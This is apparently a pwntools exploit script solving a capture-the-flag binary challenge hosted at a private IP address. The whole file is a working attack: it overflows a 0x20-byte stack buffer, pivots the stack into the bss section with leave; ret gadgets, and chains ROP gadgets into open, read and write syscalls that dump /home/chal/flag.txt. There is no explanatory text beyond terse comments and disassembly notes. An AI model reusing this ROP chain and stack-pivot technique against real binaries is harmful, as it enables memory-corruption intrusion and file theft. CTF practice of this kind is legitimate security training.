from pwn import *
context.arch = 'amd64'

# r = process("./share/chal")
r = remote("10.113.184.121", 10054)

# 0x000000000047dcbb : pop rdx ; pop rbx ; ret
pop_rdx_rbx = 0x47dcbb
pop_rdi = 0x401832
pop_rsi = 0x40f01e
pop_rdx = 0x40173f
pop_rax = 0x448d27
'''
0x401cfc <main+39>                         leave  
0x401cfd <main+40>                         ret  
'''
leave_ret = 0x401cfc
'''
0x401cdd <main+8>                          sub    rsp, 0x20
0x401ce1 <main+12>                         lea    rax, [rbp - 0x20]
0x401ce5 <main+16>                         mov    edx, 0x80
0x401cea <main+21>                         mov    rsi, rax
0x401ced <main+24>                         mov    edi, 0
0x401cf2 <main+29>                         call   read                      <read>
'''
main_read = 0x401ce1
bss1 = 0x4c2700
bss2 = 0x4c2900
bss3 = 0x4c2800
'''
.text:0000000000448280                 syscall                 ; LINUX -
.text:0000000000448282                 cmp     rax, 0FFFFFFFFFFFFF000h
.text:0000000000448288                 ja      short loc_4482E0
'''
syscall = 0x448280

payload = b'a' * 0x20 # control rbp value, so just fill to 0x20
ropc = flat([bss1, main_read]) # control rbp to bss1
# raw_input()
r.send(payload + ropc)

payload = b'/home/chal/flag.txt'.ljust(0x20, b'\x00') 
# open('flag.txt', 0, 0)
ropc = flat([bss2, pop_rdi, bss1-0x20, pop_rsi, 0, pop_rdx_rbx, 0, 0, pop_rax, 0x2, syscall, main_read])
r.send(payload + ropc)
# read(3, bss3, 0x30)
ropc = flat([bss1, pop_rdi, 3, pop_rsi, bss3, pop_rdx_rbx, 0x30, 0, pop_rax, 0x0, syscall, main_read])
r.send(payload + ropc)
# write(1, bss3, 0x30)
ropc = flat([bss2, pop_rdi, 1, pop_rsi, bss3, pop_rdx_rbx, 0x30, 0, pop_rax, 0x1, syscall, 0])
r.send(payload + ropc)

r.interactive()